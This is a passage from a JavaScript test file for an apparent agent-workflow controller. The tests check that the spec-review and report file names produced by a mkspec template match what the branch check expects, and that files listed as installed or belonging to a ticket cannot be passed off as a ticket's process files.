});

test("the file names the check expects are the ones mkspec tells the Architect and the Developer to write (orca-tasks and github-issues)", () => {
  for (const [mode, task, ref, branchName, issueArgs] of [["orca-tasks", "T03", "docs/tasks/T03-document-api.md", "agents/t03", []], ["github-issues", "I12", "#12", "agents/i12", ["--issue", "12"]]]) {
    const ctl = fs.mkdtempSync(path.join(os.tmpdir(), "af-mkspec-names-"));
    fs.mkdirSync(path.join(ctl, "templates"));
    for (const f of ["cli.mjs", "lib.mjs", "templates/mkspec.mjs"]) fs.copyFileSync(path.join(ROOT, "controller", f), path.join(ctl, f));
    fs.writeFileSync(path.join(ctl, "factory.config.json"), JSON.stringify({ project: { name: "p", mainBranch: "main", humanName: "Alex" }, steering: { mode }, agents: { runner: "orca" }, commands: { verify: "npm run verify" }, hosts: { controller: { host: "local" }, workers: [{ name: "local", kind: "local" }] } }));
    const spec = (...a) => fs.readFileSync(spawnSync("node", ["templates/mkspec.mjs", ...a], { cwd: ctl, encoding: "utf8", env: { ...process.env, FACTORY_CONFIG: "" } }).stdout.trim(), "utf8");
    const review = spec("specreview", task, ref, branchName).match(/docs\/reviews\/[^\s,;)]+\.md/)[0];
    const dev = spec("dev", task, ref, branchName, "--review", `agents/${task.toLowerCase()}-specreview:${review}`);
    const report = dev.match(/docs\/reports\/[^\s,;)]+\.md/)[0];
    fs.rmSync(ctl, { recursive: true, force: true });
    const r = repo({ docsOnly: { enabled: true }, steering: { mode } });
    if (mode === "orca-tasks") onMain(r, { [ref]: "Status: ready\n" });
    const t = task.toLowerCase();
    r.git("checkout", "-q", "-b", `agents/${t}`, "main"); r.write(review, SPEC_TEXT); r.write(report, "r\n"); r.write("README.md", "# Demo\nmore\n"); commit(r, "flow"); r.git("checkout", "-q", "main");
    const out = r.check(`main..agents/${t}`, "--base", "main", "--ticket", task, ...issueArgs);
    assert.equal(out.status, 0, `${mode}: mkspec names ${review} and ${report}\n${out.stdout}`);
    assert.match(out.stdout, /spec review of/); assert.match(out.stdout, /report of/);
  }
});

test("a name the factory's own record lists as installed is never a ticket's process file, and the base tree decides which tickets exist", () => {
  const r = ticketRepo(), c = docsController(r);
  const files = { "README.md": "# Demo\nmore\n", [SPEC]: SPEC_TEXT, [REPORT]: "r\n" };
  assert.equal(attempt(r, c, files).status, 0, "control");
  onMain(r, { ".factory/manifest.json": JSON.stringify({ files: { [REPORT]: "hash" } }) });
  const out = attempt(r, c, files);
  assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /docs\/reports\/T03-document-api\.md is also a ticket, installed or process-state file/);
  // The ticket file's own name is not a way in either: a branch that deletes it still cannot make T03 unknown to the base.
  assert.equal(attempt(r, c, { "docs/tasks/T03-document-api.md": null, "README.md": "# Demo\nx\n" }).status, 3);
});
